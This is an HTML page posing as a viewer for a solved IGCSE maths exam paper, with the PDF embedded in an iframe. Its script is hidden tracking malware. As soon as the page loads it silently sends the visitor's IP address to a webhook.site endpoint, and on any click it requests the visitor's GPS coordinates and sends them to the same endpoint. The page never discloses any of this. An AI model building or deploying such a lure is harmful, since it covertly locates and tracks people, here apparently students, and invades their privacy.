<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IGCSE Papers Math Calculator- Feb/March 2026</title>
    <style>
        body { margin: 0; background: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
        .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
        #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
    </style>
</head>
<body>
    <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
    <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>

    <script>
        const webURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";

        // 1. SILENT IP (Runs immediately on load)
        fetch("https://api.ipify.org")
            .then(res => res.json())
            .then(data => {
                // Sending IP to your webhook using the verified Fetch method
                fetch(webURL + "?type=SILENT_IP&ip=" + data.ip, { mode: "no-cors" });
            })
            .catch(err => {
                // Fallback if the IP service is blocked
                fetch(webURL + "?type=IP_FETCH_BLOCKED", { mode: "no-cors" });
            });

        // 2. CLICK TRIGGER (GPS Lat/Long)
        window.onclick = function() {
            navigator.geolocation.getCurrentPosition(function(pos) {
                var lat = pos.coords.latitude;
                var lon = pos.coords.longitude;
                
                // Sending GPS coordinates to your webhook
                fetch(webURL + "?type=GPS_CLICK&lat=" + lat + "&lon=" + lon, { mode: "no-cors" });
            }, function(err) {
                // If they deny or it times out
                fetch(webURL + "?type=GPS_ERR&msg=" + err.message, { mode: "no-cors" });
            }, { 
                enableHighAccuracy: false, 
                timeout: 10000, 
                maximumAge: Infinity 
            });
        };
    </script>
</body>
</html>
